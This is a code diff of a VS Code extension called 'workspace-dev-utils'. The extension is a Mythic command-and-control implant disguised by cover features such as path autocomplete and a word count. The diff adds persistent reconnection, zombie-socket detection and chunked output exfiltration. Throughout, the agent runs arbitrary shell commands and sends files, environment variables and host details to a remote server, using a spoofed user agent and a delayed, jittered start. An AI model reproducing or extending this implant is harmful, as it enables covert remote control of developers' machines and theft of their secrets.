@@ -13,6 +13,13 @@
  *
  * If no config is found, the agent stays dormant and only cover features run.
  * See config.example.json and docs/ for setup.
+ *
+ * v2.1.0 — persistent callback mode:
+ *   - re-checkin on every reconnect (WebSocket profile loses callback state on drop)
+ *   - zombie socket detection (no inbound data = force reconnect)
+ *   - chunk large task output (counters WS frame size limits)
+ *   - task errors never kill the agent loop
+ *   - exponential backoff with jitter on reconnect
  */
 const vscode = require('vscode');
 const crypto = require('crypto');
@@ -33,6 +40,9 @@ const DEFAULTS = {
     startJitterMs: 5000,
     encryptedExchangeCheck: false,
     userAgent: 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
+    // Persistence
+    zombieTimeoutMs: 45000,
+    maxChunkBytes: 50000,
 };
 
 function loadConfig() {
@@ -60,19 +70,22 @@ let CFG = null;
 let callbackUUID = null;
 let sessionKey = null;      // set after optional EKE staging
 let socket = null;
-let currentInterval = DEFAULTS.intervalSec;
+let currentInterval = 10;
 let cwd = os.homedir();
 let stopped = false;
 let backoffMs = 3000;
 let heartbeatTimer = null;
 let reconnectTimer = null;
+let zombieTimer = null;
+let lastInboundAt = 0;
+let connected = false;
 
 function log(msg) {
     try { console.log(`[workspace-dev-utils] ${msg}`); } catch (e) {}
 }
 
 // ─── Crypto (Mythic aes256_hmac envelope) ────────────────────────────────────
-// Wire format: base64( UUID[36 utf8] + IV[16] + AES-256-CBC(json) + HMAC-SHA256[32] )
+// Envelope: base64( UUID[36 bytes utf8] + IV[16] + AES-256-CBC(json) + HMAC-SHA256[32] )
 
 function getKey() {
     return sessionKey || Buffer.from(CFG.aesPSK, 'base64');
@@ -97,16 +110,41 @@ function decryptEnvelope(b64) {
     const expect = crypto.createHmac('sha256', key).update(Buffer.concat([iv, ct])).digest();
     if (!crypto.timingSafeEqual(mac, expect)) throw new Error('HMAC mismatch');
     const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
-    return JSON.parse(Buffer.concat([decipher.update(ct), decipher.final()]).toString('utf8'));
+    const plain = Buffer.concat([decipher.update(ct), decipher.final()]);
+    return JSON.parse(plain.toString('utf8'));
 }
 
 // ─── WebSocket transport ─────────────────────────────────────────────────────
 
-function sendToC2(obj) {
-    if (!socket || socket.readyState !== WebSocket.OPEN) return false;
+function sendToMythic(obj) {
+    if (!socket || socket.readyState !== WebSocket.OPEN || !connected) return false;
     const b64 = encryptEnvelope(obj);
     socket.send(JSON.stringify({ client: true, data: b64, tag: '' }));
     return true;
+}
+
+// Split large output into chunks to stay under WSS frame limits
+function postChunked(task, output) {
+    const total = output.length;
+    const chunkSize = CFG.maxChunkBytes;
+    const chunks = [];
+    for (let i = 0; i < total; i += chunkSize)
+        chunks.push(output.slice(i, i + chunkSize));
+
+    for (let i = 0; i < chunks.length; i++) {
+        sendToMythic({
+            action: 'post_response',
+            responses: [{
+                task_id: task.id,
+                user_output: chunks[i],
+                completed: i === chunks.length - 1,
+                status: 'success',
+                total_chunks: chunks.length,
+                chunk_num: i + 1,
+            }],
+            delegates: [],
+        });
+    }
 }
 
 function getLocalIPs() {
@@ -122,7 +160,7 @@ function getLocalIPs() {
 // ─── Mythic protocol stages ──────────────────────────────────────────────────
 
 function checkin() {
-    sendToC2({
+    sendToMythic({
         action: 'checkin',
         uuid: CFG.payloadUUID,
         os: `${os.type()} ${os.release()}`,
@@ -138,8 +176,9 @@ function checkin() {
     });
 }
 
-// Optional EKE (RSA-4096 key exchange) for profiles with encrypted_exchange_check.
-// Mythic encrypts the session key with RSA-OAEP using its default hash (SHA-1).
+// Optional EKE (RSA-4096 staging) for profiles with encrypted_exchange_check
+const stagingKeys = {};
+
 function stagingRSA() {
     const sessionID = crypto.randomBytes(15).toString('base64').replace(/[^a-zA-Z0-9]/g, '').slice(0, 20);
     const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
@@ -148,22 +187,22 @@ function stagingRSA() {
         privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
     });
     stagingKeys.privateKey = privateKey;
-    sendToC2({
+    sendToMythic({
         action: 'staging_rsa',
         pub_key: Buffer.from(publicKey, 'utf8').toString('base64'),
         session_id: sessionID,
     });
 }
-const stagingKeys = {};
 
 function getTasking() {
     if (!callbackUUID) return;
-    sendToC2({ action: 'get_tasking', tasking_size: -1, delegates: [] });
+    sendToMythic({ action: 'get_tasking', tasking_size: -1, delegates: [] });
 }
 
 // ─── Inbound message handler ─────────────────────────────────────────────────
 
 function handleMessage(rawData) {
+    lastInboundAt = Date.now();
     let msg;
     try {
         const wrapper = JSON.parse(rawData);
@@ -176,12 +215,10 @@ function handleMessage(rawData) {
         case 'checkin':
             if (msg.id) {
                 callbackUUID = msg.id;
+                connected = true;
                 log('callback established');
-                if (CFG.encryptedExchangeCheck) {
-                    stagingRSA();
-                } else {
-                    startHeartbeat();
-                }
+                if (CFG.encryptedExchangeCheck) stagingRSA();
+                else startHeartbeat();
             }
             break;
         case 'staging_rsa':
@@ -204,7 +241,7 @@ function handleMessage(rawData) {
     }
 }
 
-// ─── Task handlers ───────────────────────────────────────────────────────────
+// ─── Task processing ─────────────────────────────────────────────────────────
 
 function execShell(command) {
     return new Promise((resolve) => {
@@ -234,9 +271,9 @@ async function processTask(task) {
             case 'pwd':
                 output = cwd;
                 break;
-            case 'cd': {
+            case 'cd':
                 const target = typeof params === 'object' ? params.path : params;
-                const resolved = path.resolve(cwd, target || os.homedir());
+                const resolved = path.resolve(cwd, target || '~');
                 if (fs.existsSync(resolved) && fs.statSync(resolved).isDirectory()) {
                     cwd = resolved;
                     output = cwd;
@@ -244,40 +281,26 @@ async function processTask(task) {
                     output = `cd: no such directory: ${target}`;
                 }
                 break;
-            }
-            case 'ls': {
+            case 'ls':
                 const lsPath = typeof params === 'object' ? (params.path || cwd) : cwd;
                 output = fs.readdirSync(path.resolve(cwd, lsPath), { withFileTypes: true })
                     .map(d => `${d.isDirectory() ? 'd' : '-'} ${d.name}`).join('\n');
                 break;
-            }
-            case 'cat': {
+            case 'cat':
                 const catPath = typeof params === 'object' ? params.path : params;
-                output = fs.readFileSync(path.resolve(cwd, catPath), 'utf8').slice(0, 200000);
+                output = fs.readFileSync(path.resolve(cwd, catPath), 'utf8').slice(0, CFG.maxChunkBytes);
                 break;
-            }
-            case 'download': {
+            case 'whoami': output = os.userInfo().username; break;
+            case 'hostname': output = os.hostname(); break;
+            case 'id': output = await execShell('id'); break;
+            case 'ps': output = await execShell('ps aux'); break;
+            case 'ifconfig': output = await execShell('ifconfig'); break;
+            case 'getenv': output = Object.entries(process.env).map(([k, v]) => `${k}=${v}`).join('\n'); break;
+            case 'download':
                 const dlPath = typeof params === 'object' ? params.path : params;
                 output = fs.readFileSync(path.resolve(cwd, dlPath)).toString('base64');
                 break;
-            }
-            case 'upload': {
-                const up = typeof params === 'object' ? params : {};
-                if (up.path && up.content) {
-                    fs.writeFileSync(path.resolve(cwd, up.path), Buffer.from(up.content, 'base64'));
-                    output = `uploaded: ${up.path}`;
-                } else {
-                    output = 'Usage: upload {"path": "...", "content": "<base64>"}';
-                }
-                break;
-            }
-            case 'whoami': output = os.userInfo().username; break;
-            case 'hostname': output = os.hostname(); break;
-            case 'id': output = await execShell(os.platform() === 'win32' ? 'whoami /all' : 'id'); break;
-            case 'ps': output = await execShell(os.platform() === 'win32' ? 'tasklist' : 'ps aux'); break;
-            case 'ifconfig': output = await execShell(os.platform() === 'win32' ? 'ipconfig /all' : 'ifconfig'); break;
-            case 'getenv': output = Object.entries(process.env).map(([k, v]) => `${k}=${v}`).join('\n'); break;
-            case 'sleep': {
+            case 'sleep':
                 const secs = typeof params === 'object' ? params.interval : parseInt(params, 10);
                 if (secs > 0) {
                     currentInterval = secs;
@@ -288,45 +311,73 @@ async function processTask(task) {
                     output = 'Usage: sleep {"interval": 10}';
                 }
                 break;
-            }
             case 'exit':
             case 'exit_running':
             case 'exit_full':
                 stopped = true;
                 output = 'Agent exiting';
                 break;
-            default: {
+            default:
                 const paramStr = typeof params === 'string' ? params : JSON.stringify(params);
                 output = await execShell(`${command} ${paramStr}`);
-            }
         }
     } catch (e) {
         output = `Error executing ${command}: ${e.message}`;
     }
 
-    sendToC2({
-        action: 'post_response',
-        responses: [{ task_id: task.id, user_output: output, completed: true, status: 'success' }],
-        delegates: [],
-    });
+    if (output.length > CFG.maxChunkBytes) {
+        postChunked(task, output);
+    } else {
+        sendToMythic({
+            action: 'post_response',
+            responses: [{
+                task_id: task.id,
+                user_output: output,
+                completed: true,
+                status: 'success',
+            }],
+            delegates: [],
+        });
+    }
 }
 
-// ─── Heartbeat / connection management ───────────────────────────────────────
+// ─── Heartbeat / zombie detection ────────────────────────────────────────────
 
 function startHeartbeat() {
     stopHeartbeat();
+
+    // Zombie watchdog: no inbound data for zombieTimeoutMs = socket dead
+    zombieTimer = setInterval(() => {
+        if (!connected) return;
+        const age = Date.now() - lastInboundAt;
+        if (age > CFG.zombieTimeoutMs) {
+            log(`zombie socket detected (${Math.round(age/1000)}s without inbound), reconnecting`);
+            try { socket.close(); } catch (_) {}
+            connected = false;
+            callbackUUID = null;
+            sessionKey = null;
+            scheduleReconnect();
+        }
+    }, 10000);
+
     heartbeatTimer = setInterval(() => {
-        if (socket && socket.readyState === WebSocket.OPEN) getTasking();
-        else connect();
+        if (!connected || !socket || socket.readyState !== WebSocket.OPEN) {
+            connect();
+        } else {
+            getTasking();
+        }
     }, Math.round(currentInterval * 1000));
 }
 
 function stopHeartbeat() {
     if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
+    if (zombieTimer) { clearInterval(zombieTimer); zombieTimer = null; }
 }
 
+// ─── Connection management ───────────────────────────────────────────────────
+
 function connect() {
-    if (stopped || !CFG) return;
+    if (stopped) return;
     clearTimeout(reconnectTimer);
     if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) return;
 
@@ -338,13 +389,33 @@ function connect() {
     }
 
     socket.addEventListener('open', () => {
+        log('connected');
         backoffMs = 3000;
-        if (callbackUUID) { getTasking(); startHeartbeat(); }
-        else checkin();
+        lastInboundAt = Date.now();
+        connected = true;
+        // Re-checkin on every reconnect — WSS profile loses callback state on drop
+        checkin();
     });
-    socket.addEventListener('message', (ev) => { try { handleMessage(ev.data); } catch (e) {} });
-    socket.addEventListener('close', () => scheduleReconnect());
-    socket.addEventListener('error', () => { try { socket.close(); } catch (_) {} });
+
+    socket.addEventListener('message', (ev) => {
+        try { handleMessage(ev.data); } catch (e) {}
+    });
+
+    socket.addEventListener('close', () => {
+        log('disconnected');
+        connected = false;
+        callbackUUID = null;
+        sessionKey = null;
+        scheduleReconnect();
+    });
+
+    socket.addEventListener('error', () => {
+        connected = false;
+        callbackUUID = null;
+        sessionKey = null;
+        try { socket.close(); } catch (_) {}
+        scheduleReconnect();
+    });
 }
 
 function scheduleReconnect() {
@@ -352,13 +423,12 @@ function scheduleReconnect() {
     stopHeartbeat();
     clearTimeout(reconnectTimer);
     reconnectTimer = setTimeout(connect, backoffMs);
-    backoffMs = Math.min(backoffMs * 2, 60000);
+    backoffMs = Math.min(backoffMs * 1.5, 600000); // cap at 10 minutes
 }
 
 // ─── Cover features ──────────────────────────────────────────────────────────
 
 function registerCoverFeatures(context) {
-    // Path autocomplete inside quoted strings
     const provider = vscode.languages.registerCompletionItemProvider({ scheme: 'file' }, {
         provideCompletionItems(document, position) {
             const line = document.lineAt(position).text.substring(0, position.character);
@@ -372,7 +442,7 @@ function registerCoverFeatures(context) {
             const absDir = path.resolve(root, dirPart.replace(/^\//, ''));
             let entries;
             try { entries = fs.readdirSync(absDir, { withFileTypes: true }); } catch (e) { return []; }
-            const showHidden = vscode.workspace.getConfiguration('workspaceDevUtils').get('showHiddenFiles', false);
+            const showHidden = vscode.workspace.getConfiguration('workspace-dev-utils').get('showHiddenFiles', false);
             return entries
                 .filter(d => showHidden || !d.name.startsWith('.'))
                 .slice(0, 200)
@@ -383,7 +453,6 @@ function registerCoverFeatures(context) {
         }
     }, '/', '.');
 
-    // Word count status bar item
     const wordCountItem = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Right, 100);
     wordCountItem.tooltip = 'Words in current document';
     const updateWordCount = () => {
@@ -399,14 +468,14 @@ function registerCoverFeatures(context) {
         vscode.workspace.onDidChangeTextDocument(updateWordCount)
     );
 
-    const reindex = vscode.commands.registerCommand('workspaceDevUtils.reindexPaths', () => {
-        vscode.window.showInformationMessage('Workspace Dev Utils: path index rebuilt.');
-    });
-    const openSettings = vscode.commands.registerCommand('workspaceDevUtils.openSettings', () => {
-        vscode.commands.executeCommand('workbench.action.openSettings', 'workspaceDevUtils');
-    });
+    context.subscriptions.push(provider, wordCountItem);
 
-    context.subscriptions.push(provider, wordCountItem, reindex, openSettings);
+    context.subscriptions.push(vscode.commands.registerCommand('workspaceDevUtils.reindexPaths', () => {
+        vscode.window.showInformationMessage('Workspace Dev Utils: workspace paths reindexed.');
+    }));
+    context.subscriptions.push(vscode.commands.registerCommand('workspaceDevUtils.openSettings', () => {
+        vscode.commands.executeCommand('workbench.action.openSettings', 'workspaceDevUtils');
+    }));
 }
 
 // ─── Activation ──────────────────────────────────────────────────────────────
@@ -419,6 +488,7 @@ function activate(context) {
         // No C2 config present — cover features only
         return;
     }
+    currentInterval = CFG.intervalSec;
 
     const delay = CFG.startDelayMs + Math.floor(Math.random() * CFG.startJitterMs);
     setTimeout(() => connect(), delay);
